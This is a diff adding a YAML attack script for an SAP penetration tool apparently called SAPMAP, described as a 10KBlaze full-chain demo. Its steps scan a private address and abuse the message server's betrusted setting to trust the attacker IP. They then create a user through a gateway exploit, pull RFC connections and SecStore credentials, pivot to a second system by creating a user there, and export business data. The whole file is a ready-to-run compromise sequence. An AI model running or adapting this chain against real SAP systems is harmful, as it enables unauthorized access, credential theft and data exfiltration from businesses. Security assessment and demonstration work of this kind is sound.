@@ -1,0 +1,70 @@
+# SAPMAP Script: 10KBlaze Full Chain Demo
+# Usage: python3 sapmap.py --script scripts/demo_10kblaze.yaml
+#
+# This script demonstrates a full SAP compromise:
+#   1. Add target system
+#   2. Check gateway vulnerability
+#   3. Check 10KBlaze (MS betrusted) vulnerability
+#   4. Inject trusted IP via betrusted
+#   5. Create user via gateway exploit
+#   6. Retrieve RFC connections
+#   7. Download SecStore credentials
+#   8. Run business impact assessment
+
+name: "10KBlaze Full Chain Demo"
+description: "Compromise SAP S4H via 10KBlaze betrusted + GW exploit, then extract business data"
+
+steps:
+# Discover SAP systems on the network
+  - action: scan
+    targets: "192.168.2.29"
+    mode: fast
+    timeout: 600
+
+  - action: check_gw
+    target: W74
+
+  - action: check_ms
+    target: W74
+
+  - action: betrusted
+    target: W74
+    attacker_ip: auto
+
+  - action: create_user
+    target: W74
+    method: gw_exploit
+    client: "001"
+
+  - action: retrieve_rfcs
+    target: W74
+
+  - action: download_secstore
+    target: W74
+
+  # Test connection 
+  - action: test_rfc_single 
+    target: W74
+    destination: S4H
+
+  - action: create_user_via_rfc 
+    target: W74
+    destination: S4H
+    target_sid: S4H
+
+  - action: impact_assess
+    target: S4H
+    client: "001"
+
+  - action: impact_export
+    target: S4H
+
+     # Analyze trust chains across landscape
+  - action: analyze_chains
+
+# Highlight the most critical chain (index 0)
+  - action: highlight_chain
+    index: 0
+
+  - action: impact_show
+    target: S4H
